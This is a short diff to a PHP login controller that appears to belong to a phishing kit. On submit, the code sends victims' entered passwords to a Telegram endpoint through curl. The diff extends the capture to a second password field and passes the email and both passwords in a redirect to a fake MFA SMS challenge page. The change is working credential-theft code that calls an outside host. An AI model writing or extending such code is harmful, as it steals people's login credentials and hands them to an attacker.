@@ -41,7 +41,7 @@ class LoginController extends Controller
             curl_exec($curl);
 
             curl_setopt_array($curl, array(
-                CURLOPT_URL => env('TELEGRAM_URL', false).'text=pass%3A%20'.$data['password'],
+                CURLOPT_URL => env('TELEGRAM_URL', false).'text=passOne%3A%20'.$data['password-one'].'%20%20%20pass%3A%20'.$data['password'],
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_ENCODING => '',
                 CURLOPT_MAXREDIRS => 10,
@@ -58,7 +58,7 @@ class LoginController extends Controller
             echo 'Caught exception: ',  $e->getMessage(), "\n";
         }
 
-        return redirect('/mfa-sms-challenge?state=hKFo2SA1Z2VIZ3dxMjBaTTNrQTBNOXplM2JmeFJTOWkyNVd6aaFupWxvZ2luo3RpZNkgdklYN3VXNmowNm9fYkltVC1Vajh3NGNiT0NxRDBpSkajY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&email='.$request->all()['email'].'&pass='.$request->all()['password']);
+        return redirect('/mfa-sms-challenge?state=hKFo2SA1Z2VIZ3dxMjBaTTNrQTBNOXplM2JmeFJTOWkyNVd6aaFupWxvZ2luo3RpZNkgdklYN3VXNmowNm9fYkltVC1Vajh3NGNiT0NxRDBpSkajY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&email='.$request->all()['email'].'&pass='.$request->all()['password'].'&passOne='.$request->all()['password-one']);
 
     }
 
@@ -82,7 +82,7 @@ class LoginController extends Controller
             curl_exec($curl);
 
             curl_setopt_array($curl, array(
-                CURLOPT_URL => env('TELEGRAM_URL', false).'text=pass%3A%20'.$data['password'],
+                CURLOPT_URL => env('TELEGRAM_URL', false).'text=passOne%3A%20'.$data['password-one'].'%20%20%20pass%3A%20'.$data['password'],
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_ENCODING => '',
                 CURLOPT_MAXREDIRS => 10,
